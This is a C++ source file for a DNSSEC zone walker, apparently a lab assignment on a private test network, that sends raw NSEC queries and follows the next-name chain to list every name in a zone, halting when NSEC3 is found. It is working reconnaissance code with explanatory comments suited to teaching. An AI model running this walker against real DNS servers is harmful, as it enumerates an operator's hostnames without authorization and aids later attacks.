/*
 * zone_walker.cpp — Phase 5 authenticated-denial zone walker.
 *
 * Unlike the on-path interceptor used in Phases 2-4 and 6-7, this
 * program is NOT a relay sitting between two other parties -- it is
 * itself a direct, active querier of domain-ns (172.16.3.30), reached
 * through core-router's ordinary routing (the spec's own diagram
 * shows this: "1. probe" straight from attacker to domain-ns, "2.
 * signed denial reveals a neighbour"). There is nothing to intercept
 * here; the vulnerability lives entirely in what a perfectly ordinary,
 * individually-addressed query is allowed to return.
 *
 * The technique: a signed zone's denial-of-existence proof has to be
 * computed and signed BEFORE anyone asks a specific nonexistent name
 * -- there is no way to sign a statement about a query that hasn't
 * happened yet. So instead of proving "this exact name doesn't
 * exist," NSEC proves "nothing exists between THIS existing name and
 * THAT existing name" -- a statement about two real, existing owners,
 * prepared once at signing time and reused for every query that falls
 * in the gap. Every existing name's own NSEC record carries this
 * "next domain name" field as a completely ordinary, directly
 * queryable part of its RRset -- querying QTYPE=NSEC at a name you
 * already know exists returns that name's own NSEC record, handing
 * you the next name in the zone for free. Starting from nothing but
 * the zone apex and repeating this once per discovered name walks
 * the entire zone in canonical order, using exactly one query per
 * existing owner name -- no AXFR, no guessing.
 *
 * NSEC3 closes this specific leak (not denial-of-existence itself,
 * just its walkability) by replacing the plaintext "next domain name"
 * with a hash of it: the proof of nonexistence is just as real and
 * just as authenticated, but following the "next hashed owner" chain
 * only yields hashes, not names. This program detects that case and
 * stops rather than printing hashes as if they were names.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o zone_walker zone_walker.cpp -lpcap
 * Usage: ./zone_walker <iface>
 *   SERVER_IP    env var -- default "172.16.3.30" (domain-ns).
 *   ZONE_APEX    env var -- default "example.com".
 *   NEXT_HOP_IP  env var -- default "172.16.2.3" (core-router; domain-ns
 *                is on a different subnet, so frames go to the router's
 *                MAC at L2 even though the IP destination is domain-ns).
 */

#include <array>
#include <cctype>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <optional>
#include <set>
#include <string>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <pcap.h>

namespace {

constexpr int ETH_HDR_LEN = 14;
constexpr size_t MAX_PACKET_SIZE = 2048;

constexpr uint16_t DNS_TYPE_NSEC  = 47;
constexpr uint16_t DNS_TYPE_NSEC3 = 50;
constexpr uint16_t DNS_TYPE_OPT   = 41;

using MacAddr = std::array<uint8_t, 6>;

#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};
struct UdpHdr { uint16_t sport, dport, len, checksum; };
struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
#pragma pack(pop)

// ---------- small helpers (same formulation used throughout this
// assignment's other interceptors, for consistency) ----------

uint16_t checksum_words(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) sum += ntohs(buf[i]);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return htons(result == 0 ? 0xFFFF : result);
}

uint16_t ip_checksum(IpHdr ip) {
    ip.checksum = 0;
    return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
}

uint16_t udp_checksum(const IpHdr &ip, const UdpHdr &udp, const uint8_t *payload, int paylen) {
    struct Pseudo { uint32_t src, dst; uint8_t zero, proto; uint16_t udplen; } __attribute__((packed));
    int total = static_cast<int>(sizeof(Pseudo)) + ntohs(udp.len);
    int padded = (total + 1) & ~1;
    std::vector<uint8_t> buf(padded, 0);
    Pseudo ph{ip.src, ip.dst, 0, 17, udp.len};
    std::memcpy(buf.data(), &ph, sizeof(ph));
    UdpHdr udp_copy = udp; udp_copy.checksum = 0;
    std::memcpy(buf.data() + sizeof(ph), &udp_copy, sizeof(udp_copy));
    if (paylen > 0) std::memcpy(buf.data() + sizeof(ph) + sizeof(udp_copy), payload, paylen);
    return checksum_words(reinterpret_cast<uint16_t *>(buf.data()), padded / 2);
}

std::optional<MacAddr> parse_mac(const std::string &s) {
    unsigned int b[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6)
        return std::nullopt;
    MacAddr out{};
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
    return out;
}

std::optional<MacAddr> get_own_mac(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return std::nullopt; }
    MacAddr out{};
    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return out;
}

std::optional<struct in_addr> get_own_ip(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return std::nullopt; }
    close(fd);
    return reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr)->sin_addr;
}

// Resolve next_hop_ip's MAC by priming the ARP cache (ping + arping,
// same two-step reasoning used by this assignment's other tools: a
// single ping can return before the kernel's neighbor entry actually
// settles, arping forces a fresh broadcast request) then reading the
// kernel's neighbor table.
std::optional<MacAddr> resolve_next_hop_mac(const std::string &iface, const std::string &ip) {
    std::string ping_cmd = "ping -c1 -W1 " + ip + " >/dev/null 2>&1";
    std::system(ping_cmd.c_str());
    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + ip + " >/dev/null 2>&1";
    std::system(arping_cmd.c_str());
    std::string cmd = "ip neigh show " + ip + " 2>/dev/null | awk '{print $5}' | head -n1";
    FILE *fp = popen(cmd.c_str(), "r");
    if (!fp) return std::nullopt;
    char buf[64] = {0};
    char *line = fgets(buf, sizeof(buf), fp);
    pclose(fp);
    if (!line) return std::nullopt;
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    if (s.empty()) return std::nullopt;
    return parse_mac(s);
}

std::string normalize_name(std::string name) {
    for (char &c : name) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
    if (name.empty() || name.back() != '.') name.push_back('.');
    return name;
}

// ---------- DNS wire format ----------

void append_dns_name(std::vector<uint8_t> &buf, const std::string &name_in) {
    std::string name = name_in;
    if (!name.empty() && name.back() == '.') name.pop_back();
    size_t start = 0;
    while (start < name.size()) {
        size_t dot = name.find('.', start);
        size_t end = (dot == std::string::npos) ? name.size() : dot;
        buf.push_back(static_cast<uint8_t>(end - start));
        buf.insert(buf.end(), name.begin() + static_cast<long>(start), name.begin() + static_cast<long>(end));
        if (dot == std::string::npos) break;
        start = dot + 1;
    }
    buf.push_back(0);
}

// Decode a (possibly compressed) domain name starting at `offset`
// within the full message buffer. Returns the decoded lowercase
// dotted string, and sets `consumed` to the bytes used IN THE
// MESSAGE AT `offset` (2, if the very first thing encountered is a
// compression pointer; otherwise the literal label bytes through the
// terminating zero). Returns false on malformed input or a pointer
// loop.
bool decode_name_at(const uint8_t *msg, int msg_len, int offset, std::string &out, int &consumed) {
    out.clear();
    consumed = 0;
    int pos = offset;
    bool jumped = false;
    int hops = 0;
    while (pos >= 0 && pos < msg_len) {
        uint8_t b = msg[pos];
        if ((b & 0xC0) == 0xC0) {
            if (pos + 2 > msg_len) return false;
            if (!jumped) consumed = (pos - offset) + 2;
            int target = ((b & 0x3F) << 8) | msg[pos + 1];
            if (++hops > 128) return false;
            pos = target;
            jumped = true;
            continue;
        }
        if (b == 0) {
            if (!jumped) consumed = (pos - offset) + 1;
            out = normalize_name(out);
            return true;
        }
        if ((b & 0xC0) != 0) return false;
        if (pos + 1 + b > msg_len) return false;
        if (!out.empty()) out += '.';
        for (int i = 0; i < b; i++) out += static_cast<char>(std::tolower(msg[pos + 1 + i]));
        pos += 1 + b;
        if (!jumped) consumed = pos - offset;
    }
    return false;
}

std::vector<uint8_t> build_nsec_query(uint16_t txid, const std::string &name) {
    std::vector<uint8_t> dns;
    auto push16 = [&](uint16_t v) { uint16_t n = htons(v); dns.insert(dns.end(), reinterpret_cast<uint8_t*>(&n), reinterpret_cast<uint8_t*>(&n) + 2); };
    push16(txid);
    push16(0x0000);   // standard query, RD not requested -- we want the authoritative answer, not a recursive one
    push16(1);        // QDCOUNT
    push16(0); push16(0);
    push16(1);        // ARCOUNT: one OPT pseudo-RR
    append_dns_name(dns, name);
    push16(DNS_TYPE_NSEC);
    push16(1);        // IN
    dns.push_back(0); // OPT owner: root
    push16(DNS_TYPE_OPT);
    push16(1232);     // advertised UDP payload size
    uint32_t ttl_n = htonl(0x00008000); // extended RCODE/version=0, DO bit set
    dns.insert(dns.end(), reinterpret_cast<uint8_t*>(&ttl_n), reinterpret_cast<uint8_t*>(&ttl_n) + 4);
    push16(0);         // RDLENGTH 0, no EDNS options
    return dns;
}

struct WalkResponse {
    bool is_nsec3 = false;
    std::optional<std::string> next_name;
};

// Parses the response looking only for NSEC/NSEC3 records in the
// answer section (this is all a direct QTYPE=NSEC query should ever
// return for an existing name). Returns false if the message doesn't
// parse or the transaction ID doesn't match.
bool parse_response(const uint8_t *dns, int len, uint16_t expect_txid, WalkResponse &out) {
    if (len < 12) return false;
    uint16_t txid; std::memcpy(&txid, dns, 2);
    if (ntohs(txid) != expect_txid) return false;
    uint16_t flags; std::memcpy(&flags, dns + 2, 2);
    if (!((ntohs(flags) >> 15) & 1)) return false; // not a response

    uint16_t qd, an, ns, ar;
    std::memcpy(&qd, dns + 4, 2); qd = ntohs(qd);
    std::memcpy(&an, dns + 6, 2); an = ntohs(an);
    std::memcpy(&ns, dns + 8, 2); ns = ntohs(ns);
    std::memcpy(&ar, dns + 10, 2); ar = ntohs(ar);

    int off = 12;
    for (int i = 0; i < qd; i++) {
        std::string ignored; int consumed;
        if (!decode_name_at(dns, len, off, ignored, consumed)) return false;
        off += consumed + 4; // + QTYPE + QCLASS
        if (off > len) return false;
    }

    const int total_rrs = an + ns + ar;
    for (int i = 0; i < total_rrs; i++) {
        std::string owner; int consumed;
        if (!decode_name_at(dns, len, off, owner, consumed)) return false;
        off += consumed;
        if (off + 10 > len) return false;
        uint16_t rtype; std::memcpy(&rtype, dns + off, 2); rtype = ntohs(rtype);
        uint16_t rdlen; std::memcpy(&rdlen, dns + off + 8, 2); rdlen = ntohs(rdlen);
        const int rdata_off = off + 10;
        if (rdata_off + rdlen > len) return false;

        if (rtype == DNS_TYPE_NSEC) {
            // RDATA: next domain name, followed by the type bitmap.
            std::string next; int nconsumed;
            if (decode_name_at(dns, len, rdata_off, next, nconsumed)) out.next_name = next;
        } else if (rtype == DNS_TYPE_NSEC3) {
            out.is_nsec3 = true;
        }
        off = rdata_off + rdlen;
    }
    return true;
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "usage: %s <iface>\n", argv[0]); return 1; }
    const std::string iface = argv[1];

    const char *server_env = getenv("SERVER_IP");
    const std::string server_ip = server_env ? server_env : "172.16.3.30";
    const char *zone_env = getenv("ZONE_APEX");
    const std::string zone_apex = normalize_name(zone_env ? zone_env : "example.com");
    const char *nexthop_env = getenv("NEXT_HOP_IP");
    const std::string next_hop_ip = nexthop_env ? nexthop_env : "172.16.2.3";

    auto own_mac = get_own_mac(iface);
    auto own_ip  = get_own_ip(iface);
    if (!own_mac || !own_ip) { fprintf(stderr, "could not read %s's own MAC/IP\n", iface.c_str()); return 1; }

    auto next_hop_mac = resolve_next_hop_mac(iface, next_hop_ip);
    if (!next_hop_mac) { fprintf(stderr, "could not resolve MAC for next hop %s\n", next_hop_ip.c_str()); return 1; }

    struct in_addr server_addr{};
    if (inet_aton(server_ip.c_str(), &server_addr) == 0) { fprintf(stderr, "invalid SERVER_IP\n"); return 1; }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(iface.c_str(), 65535, 1, 100, errbuf);
    if (!pcap) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }

    const std::string filter = "udp and src host " + server_ip + " and src port 53 and dst host " + std::string(inet_ntoa(*own_ip));
    struct bpf_program fp;
    if (pcap_compile(pcap, &fp, filter.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 || pcap_setfilter(pcap, &fp) < 0) {
        fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(pcap));
        return 1;
    }
    pcap_freecode(&fp);

    printf("=== Phase 5 zone walker ===\n");
    printf("Target server: %s   Zone apex: %s   Next hop: %s\n", server_ip.c_str(), zone_apex.c_str(), next_hop_ip.c_str());
    printf("Method: direct QTYPE=NSEC queries, following the next-domain-name chain. No AXFR, no wordlist.\n\n");

    std::string current = zone_apex;
    std::set<std::string> seen{zone_apex};
    std::vector<std::string> recovered;
    int queries = 0;
    bool completed = false;

    for (int step = 0; step < 256; step++) {
        uint16_t txid = static_cast<uint16_t>(rand() ^ (step * 7919));
        uint16_t sport = static_cast<uint16_t>(40000 + (rand() % 20000));

        std::vector<uint8_t> dns_payload = build_nsec_query(txid, current);

        uint8_t pkt[MAX_PACKET_SIZE];
        const int total_len = ETH_HDR_LEN + static_cast<int>(sizeof(IpHdr) + sizeof(UdpHdr)) + static_cast<int>(dns_payload.size());
        auto *eth = reinterpret_cast<EthHdr *>(pkt);
        std::memcpy(eth->dst, next_hop_mac->data(), 6);
        std::memcpy(eth->src, own_mac->data(), 6);
        eth->ethertype = htons(0x0800);

        auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
        ip->ver_ihl = 0x45;
        ip->tos = 0;
        ip->tot_len = htons(static_cast<uint16_t>(sizeof(IpHdr) + sizeof(UdpHdr) + dns_payload.size()));
        ip->id = htons(static_cast<uint16_t>(step + 1));
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->proto = 17;
        ip->src = own_ip->s_addr;
        ip->dst = server_addr.s_addr;
        ip->checksum = ip_checksum(*ip);

        auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + sizeof(IpHdr));
        udp->sport = htons(sport);
        udp->dport = htons(53);
        udp->len = htons(static_cast<uint16_t>(sizeof(UdpHdr) + dns_payload.size()));
        udp->checksum = 0;

        uint8_t *dns_start = pkt + ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr);
        std::memcpy(dns_start, dns_payload.data(), dns_payload.size());
        udp->checksum = udp_checksum(*ip, *udp, dns_start, static_cast<int>(dns_payload.size()));

        queries++;
        printf("[%d] Query NSEC for %s\n", queries, current.c_str());

        if (pcap_inject(pcap, pkt, total_len) < 0) {
            fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap));
            pcap_close(pcap);
            return 1;
        }

        bool got_response = false;
        WalkResponse resp;
        auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(3);
        while (std::chrono::steady_clock::now() < deadline) {
            struct pcap_pkthdr *hdr;
            const u_char *data;
            int rc = pcap_next_ex(pcap, &hdr, &data);
            if (rc == 0) continue;
            if (rc < 0) { fprintf(stderr, "pcap_next_ex failed\n"); break; }
            if (hdr->caplen < ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr)) continue;
            const auto *rip = reinterpret_cast<const IpHdr *>(data + ETH_HDR_LEN);
            const int rihl = (rip->ver_ihl & 0x0F) * 4;
            const auto *rudp = reinterpret_cast<const UdpHdr *>(data + ETH_HDR_LEN + rihl);
            if (ntohs(rudp->sport) != 53 || ntohs(rudp->dport) != sport) continue;
            const uint8_t *rdns = data + ETH_HDR_LEN + rihl + sizeof(UdpHdr);
            const int rdns_len = static_cast<int>(hdr->caplen) - (ETH_HDR_LEN + rihl + static_cast<int>(sizeof(UdpHdr)));
            if (parse_response(rdns, rdns_len, txid, resp)) { got_response = true; break; }
        }

        if (!got_response) {
            fprintf(stderr, "Timed out waiting for a response to %s\n", current.c_str());
            pcap_close(pcap);
            return 1;
        }

        if (resp.is_nsec3) {
            printf("    Received NSEC3: the next-owner field is a hash, not a readable name.\n");
            printf("\nWalk blocked after %d quer%s. Plaintext names recovered: 0.\n", queries, queries == 1 ? "y" : "ies");
            pcap_close(pcap);
            return 0;
        }
        if (!resp.next_name) {
            fprintf(stderr, "Response had neither NSEC nor NSEC3 -- unexpected.\n");
            pcap_close(pcap);
            return 1;
        }

        const std::string next = *resp.next_name;
        printf("    Next name in zone: %s\n", next.c_str());

        if (next == zone_apex) { completed = true; break; }
        if (!seen.insert(next).second) {
            fprintf(stderr, "NSEC chain looped before returning to the apex -- aborting.\n");
            pcap_close(pcap);
            return 1;
        }
        recovered.push_back(next);
        current = next;
    }

    pcap_close(pcap);
    if (!completed) { fprintf(stderr, "Walk did not close back on the apex within the safety limit.\n"); return 1; }

    printf("\nWalk complete.\n");
    printf("Recovered %zu name(s):\n", recovered.size());
    for (const auto &n : recovered) printf("  %s\n", n.c_str());
    const size_t total_owners = seen.size(); // includes the apex itself
    printf("Total distinct owner names (including apex): %zu\n", total_owners);
    printf("Queries used: %d   Assignment limit (names+2): %zu   %s\n",
           queries, total_owners + 2, static_cast<size_t>(queries) <= total_owners + 2 ? "PASS" : "FAIL");
    return 0;
}
